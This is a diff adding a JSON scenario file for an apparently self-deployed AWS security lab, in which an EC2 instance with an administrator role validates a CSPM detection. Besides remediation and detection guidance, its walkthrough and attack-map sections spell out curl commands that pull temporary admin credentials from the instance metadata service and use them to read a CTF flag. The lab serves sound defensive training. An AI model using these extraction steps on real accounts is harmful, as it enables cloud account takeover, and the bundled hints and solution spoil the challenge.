@@ -1,0 +1,236 @@
+{
+  "displayName": "EC2 Instance with Privileged Role to Admin",
+  "name": "cspm-ec2-001-instance-with-privileged-role",
+  "description": "EC2 instance with a highly privileged IAM role attached - validates CSPM detection",
+  "costEstimate": "$5/mo",
+  "pathfindingCloudId": "cspm-ec2-001",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "CSPM: Misconfig",
+  "subCategory": "Compute",
+  "pathType": "single-condition",
+  "target": "to-admin",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0006 - Credential Access"
+    ],
+    "techniques": [
+      "T1552.005 - Unsecured Credentials: Cloud Instance Metadata API",
+      "T1078.004 - Valid Accounts: Cloud Accounts"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_cspm_misconfig_cspm_ec2_001_instance_with_privileged_role",
+    "modulePath": "modules/scenarios/single-account/cspm-misconfig/cspm-ec2-001-instance-with-privileged-role"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/cspm-misconfig/cspm-ec2-001-instance-with-privileged-role",
+  "schemaVersion": "4.6.0",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-cspm-ec2-001-demo-user",
+        "required": [
+          {
+            "permission": "ssm:StartSession",
+            "resource": "arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance",
+            "description": "allows opening an interactive session on the instance"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "ssm:DescribeInstanceInformation",
+            "purpose": "allows confirming the SSM agent is online before attempting a session"
+          },
+          {
+            "permission": "sts:GetCallerIdentity",
+            "purpose": "allows verifying current identity at each stage of the attack"
+          }
+        ]
+      }
+    ]
+  },
+  "cspmDetection": {
+    "rule_id": "aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it",
+    "severity": "high",
+    "expected_finding": {
+      "resource_type": "aws_ec2_instance",
+      "resource_id": "pl-cspm-ec2-001-instance",
+      "finding": "Instance has role with AdministratorAccess policy attached"
+    }
+  },
+  "risk": {
+    "summary": "Anyone with access to this EC2 instance can leverage the administrative IAM role",
+    "impact": [
+      "Instance compromise leads to full AWS account compromise",
+      "Credentials can be extracted from IMDS (Instance Metadata Service)",
+      "Lateral movement to any AWS resource is possible",
+      "Data exfiltration across the entire account"
+    ]
+  },
+  "remediation": {
+    "recommendations": [
+      "Remove AdministratorAccess policy from the instance role",
+      "Grant only the specific permissions required by applications on the instance",
+      "Use separate roles for different workloads",
+      "Implement IMDSv2 to require session tokens for metadata access",
+      "Monitor for unusual IMDS access patterns",
+      "Consider using AWS Secrets Manager instead of instance roles for sensitive operations"
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a misconfiguration that allows you to move from the `pl-cspm-ec2-001-demo-user` IAM user (which has only SSM access) to the `pl-cspm-ec2-001-admin-role` administrative role by starting an SSM session on the `pl-cspm-ec2-001-instance` EC2 instance and extracting credentials from the Instance Metadata Service (IMDS).\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-cspm-ec2-001-demo-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-cspm-ec2-001-admin-role`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew tap DataDog/pathfinding-labs https://github.com/DataDog/pathfinding-labs\n   brew install DataDog/pathfinding-labs/plabs\n   ```\n   Or with Go 1.25+ installed:\n   ```bash\n   go install github.com/DataDog/pathfinding-labs/cmd/plabs@latest\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable cspm-ec2-001-to-admin\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `cspm-ec2-001-to-admin` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n|-----|---------|\n| `arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance` | EC2 instance with privileged role attached |\n| `arn:aws:iam::{account_id}:role/pl-cspm-ec2-001-admin-role` | IAM role with AdministratorAccess attached |\n| `arn:aws:iam::{account_id}:instance-profile/pl-cspm-ec2-001-instance-profile` | Instance profile linking the role to the EC2 instance |\n| `arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/cspm-ec2-001-to-admin` | CTF flag stored in SSM Parameter Store |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Authenticate as a user with only SSM access\n2. Start an SSM session to the instance\n3. Guide you through extracting admin credentials from IMDS\n4. Retrieve the CTF flag from SSM Parameter Store using the stolen admin credentials\n5. Show the full impact of this misconfiguration",
+        "resourcesCreated": "- No persistent artifacts are created by the demo script; it demonstrates read-only credential extraction from IMDS",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo cspm-ec2-001-instance-with-privileged-role\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cspm-ec2-001-to-admin` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup cspm-ec2-001-instance-with-privileged-role\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cspm-ec2-001-to-admin` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable cspm-ec2-001-to-admin\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `cspm-ec2-001-to-admin` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- EC2 instance `pl-cspm-ec2-001-instance` has a highly privileged IAM role (`pl-cspm-ec2-001-admin-role`) attached via instance profile\n- Role `pl-cspm-ec2-001-admin-role` has the `AdministratorAccess` AWS managed policy attached, granting unrestricted access to all AWS services\n- Instance profile grants any process running on the instance the ability to assume administrative credentials via IMDS without authentication\n- No IMDSv2 enforcement (`http_tokens = required`) is configured, allowing unauthenticated metadata retrieval",
+        "prevention": "- Remove `AdministratorAccess` from the instance role and grant only the specific permissions required by applications running on the instance\n- Enforce IMDSv2 by setting `http_tokens = required` and `http_put_response_hop_limit = 1` on all EC2 instances to prevent credential theft by containerized workloads\n- Use separate IAM roles for different workloads rather than a single broad role\n- Implement an SCP that denies attachment of `AdministratorAccess` or any `*:*` policy to EC2 instance profiles\n- Use AWS Secrets Manager or IAM Roles Anywhere instead of instance roles for sensitive credentials\n- Monitor IMDS access patterns with CloudWatch Logs and GuardDuty to detect unusual credential extraction"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `sts:AssumeRole` -- Role assumed via instance profile; suspicious when called from an EC2 instance with an administrative role and followed by high-privilege API calls\n- `ec2:DescribeInstances` -- Reconnaissance after gaining admin credentials extracted from IMDS\n- `iam:ListAttachedRolePolicies` -- Attacker enumerating the permissions of the instance role\n- `ssm:StartSession` -- SSM session started to the instance; the initial access vector in the demo",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "solution": "# Guided Walkthrough: CSPM Misconfiguration \u2014 EC2 Instance with Highly Privileged IAM Role\n\nThis scenario validates the CSPM detection rule:\n\n**`aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it`**\n\nAnyone with access to the `pl-cspm-ec2-001-instance` EC2 instance can leverage the administrative IAM role attached to it. Access vectors include SSM Session Manager, SSH, vulnerability exploits, and supply chain attacks. Once on the instance, credentials are trivially extracted from the Instance Metadata Service (IMDS) at `169.254.169.254`, yielding full AWS account access.\n\nThis misconfiguration is common in environments where developers attach `AdministratorAccess` for convenience during initial setup and the permission is never scoped down. Detection difficulty is high because legitimate IMDS access is indistinguishable from malicious credential harvesting without additional controls.\n\n## The Challenge\n\nYou start as the `pl-cspm-ec2-001-demo-user` IAM user. This user has a narrow permission set: it can start SSM sessions on the `pl-cspm-ec2-001-instance` EC2 instance, but it cannot call IAM APIs, list S3 buckets, or do anything else of consequence in the account.\n\nYour goal is to obtain credentials for the `pl-cspm-ec2-001-admin-role` IAM role, which has `AdministratorAccess` attached. The role is not directly assumable by your user \u2014 but it is attached to the EC2 instance you can access.\n\n## Reconnaissance\n\nFirst, confirm who you are and what you can (and cannot) do:\n\n```bash\naws sts get-caller-identity\n# Returns: pl-cspm-ec2-001-demo-user\n\naws iam list-users --max-items 1\n# Returns: AccessDenied \u2014 your user has no IAM permissions\n```\n\nNow check that the instance is available via SSM:\n\n```bash\naws ssm describe-instance-information \\\n  --filters \"Key=InstanceIds,Values=<INSTANCE_ID>\" \\\n  --query 'InstanceInformationList[0].PingStatus' \\\n  --output text\n# Returns: Online\n```\n\n## Exploitation\n\nWith the instance reachable over SSM, open an interactive session. From the demo user's perspective, this is a legitimate operation \u2014 `ssm:StartSession` is exactly what the user is permitted to do.\n\n```bash\naws ssm start-session --region <REGION> --target <INSTANCE_ID>\n```\n\nYou are now inside the instance as `ssm-user`. From here, the Instance Metadata Service is reachable at the link-local address `169.254.169.254` without any authentication.\n\nFirst, obtain an IMDSv2 session token (good practice even if IMDSv2 is not enforced):\n\n```bash\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" \\\n  -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)\n```\n\nNext, retrieve the name of the IAM role attached to this instance:\n\n```bash\nROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)\necho \"Attached role: $ROLE_NAME\"\n# Returns: pl-cspm-ec2-001-admin-role\n```\n\nNow extract the temporary credentials for that role:\n\n```bash\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq .\n```\n\nThe response contains `AccessKeyId`, `SecretAccessKey`, and `Token` \u2014 temporary credentials for `pl-cspm-ec2-001-admin-role`.\n\n## Verification\n\nExit the SSM session and use the extracted credentials to verify administrative access:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<Token>\n\naws sts get-caller-identity\n# Returns: arn:aws:sts::<ACCOUNT>:assumed-role/pl-cspm-ec2-001-admin-role/...\n\naws iam list-users\n# Returns: full list of IAM users \u2014 you now have AdministratorAccess\n```\n\n## Capture the Flag\n\nWith the temporary credentials for `pl-cspm-ec2-001-admin-role` in hand, exit the SSM session and retrieve the scenario flag from SSM Parameter Store. `AdministratorAccess` grants unrestricted access to all AWS services, including `ssm:GetParameter` on every parameter in the account:\n\n```bash\nexport AWS_ACCESS_KEY_ID=<AccessKeyId>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey>\nexport AWS_SESSION_TOKEN=<Token>\n\naws ssm get-parameter \\\n  --region <REGION> \\\n  --name /pathfinding-labs/flags/cspm-ec2-001-to-admin \\\n  --query 'Parameter.Value' \\\n  --output text\n```\n\nA successful response returns the flag value, confirming full administrative access to the account.\n\n## What Happened\n\nYou started with a user that had only the right to open an SSM session on one EC2 instance. That turned out to be sufficient to gain full administrative control of the AWS account, because the instance had `AdministratorAccess` attached to it via an instance profile.\n\nThe IMDS is a feature, not a vulnerability \u2014 every EC2 instance exposes it by default. The misconfiguration is the combination of a highly privileged role and broad instance access. In a real environment this plays out through many vectors beyond SSM: a developer with SSH access, a vulnerable web application running on the instance, a malicious package pulled in via a build pipeline, or a compromised AMI. Any code execution on the instance is sufficient.\n\nThe CSPM finding (`aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it`) catches this statically \u2014 before any attacker arrives \u2014 by analyzing the relationship between the instance profile, the attached role, and the policies on that role. That is the value of CSPM: finding this class of misconfiguration at configuration time rather than in a post-incident review.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Demo User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-cspm-ec2-001-demo-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has ssm:StartSession permission on the pl-cspm-ec2-001-instance EC2 instance. It has no other meaningful AWS permissions -- it cannot list IAM users, read S3 buckets, or call any other privileged API.\n"
+      },
+      {
+        "id": "ec2-instance",
+        "label": "EC2 Instance",
+        "type": "resource",
+        "subType": "ec2-instance",
+        "arn": "arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance",
+        "description": "This EC2 instance has an administrative IAM role attached via an instance profile. Any process running on the instance can retrieve temporary admin credentials from the Instance Metadata Service (IMDS) at 169.254.169.254 without authentication. The SSM agent is running, making it reachable via SSM Session Manager.\n"
+      },
+      {
+        "id": "admin-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isAdmin": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-cspm-ec2-001-admin-role",
+        "description": "This IAM role has the AdministratorAccess AWS managed policy attached, granting unrestricted access to all AWS services and resources. By extracting the temporary credentials vended by the instance profile via IMDS, an attacker gains full administrative control of the AWS account. AdministratorAccess implicitly grants ssm:GetParameter on all parameters in the account, allowing the attacker to read the scenario CTF flag from SSM Parameter Store.\n"
+      },
+      {
+        "id": "ctf-flag",
+        "label": "CTF Flag",
+        "type": "resource",
+        "subType": "ssm-parameter",
+        "isTarget": true,
+        "arn": "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/cspm-ec2-001-to-admin",
+        "description": "The CTF flag for this scenario, stored as an SSM parameter in the victim account. Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is granted implicitly by AdministratorAccess). Once you have extracted the temporary credentials from IMDS and exported them, use ssm:GetParameter to read this parameter and prove full account access.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "ec2-instance",
+        "label": "ssm:StartSession",
+        "description": "The demo user has ssm:StartSession permission on this EC2 instance. Starting an SSM session drops you into an interactive shell inside the instance as ssm-user, from which the IMDS is reachable at 169.254.169.254.\n",
+        "hints": [
+          "Run aws ssm start-session --target <INSTANCE_ID> to open an interactive shell on the instance. Once inside, your IAM user's restrictions no longer apply \u2014 you operate with whatever the instance can access via the attached instance profile.",
+          "From inside the instance, query IMDSv2: PUT to http://169.254.169.254/latest/api/token to get a session token, then GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME> to retrieve temporary credentials. Export AccessKeyId, SecretAccessKey, and Token as environment variables.",
+          "Browse to https://pathfinding.cloud/paths/cspm-ec2-001 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Confirm the SSM agent is online on the target instance",
+            "command": "aws ssm describe-instance-information --filters 'Key=InstanceIds,Values=<INSTANCE_ID>' --query 'InstanceInformationList[0].PingStatus' --output text"
+          },
+          {
+            "description": "Start an interactive SSM session on the EC2 instance",
+            "command": "aws ssm start-session --region <REGION> --target <INSTANCE_ID>"
+          }
+        ]
+      },
+      {
+        "from": "ec2-instance",
+        "to": "admin-role",
+        "label": "IMDS credential extraction",
+        "description": "Any process on the EC2 instance can retrieve temporary credentials for the attached administrative role by querying the Instance Metadata Service. No additional permissions or authentication are required -- the IMDS endpoint is reachable from within the instance at the link-local address 169.254.169.254.\n",
+        "hints": [],
+        "commands": [
+          {
+            "description": "Obtain an IMDSv2 session token",
+            "command": "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" 2>/dev/null)"
+          },
+          {
+            "description": "Retrieve the name of the attached IAM role from IMDS",
+            "command": "ROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)"
+          },
+          {
+            "description": "Extract temporary admin credentials from IMDS",
+            "command": "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq ."
+          },
+          {
+            "description": "Verify administrative access using extracted credentials",
+            "command": "AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws iam list-users"
+          }
+        ]
+      },
+      {
+        "from": "admin-role",
+        "to": "ctf-flag",
+        "label": "ssm:GetParameter",
+        "description": "With temporary credentials for the administrative role extracted from IMDS, call ssm:GetParameter to read the scenario CTF flag from SSM Parameter Store. AdministratorAccess grants unrestricted access to all AWS services, so no additional permissions are required beyond the credentials already obtained.\n",
+        "hints": [
+          "Export the three IMDS credential fields as AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN, then call ssm:GetParameter with the full parameter name to retrieve the flag."
+        ],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from SSM Parameter Store using the extracted admin credentials",
+            "command": "aws ssm get-parameter --region <REGION> --name /pathfinding-labs/flags/cspm-ec2-001-to-admin --query 'Parameter.Value' --output text"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "ssm"
+  ],
+  "slug": "cspm-ec2-001",
+  "hasDemoTranscript": false
+}
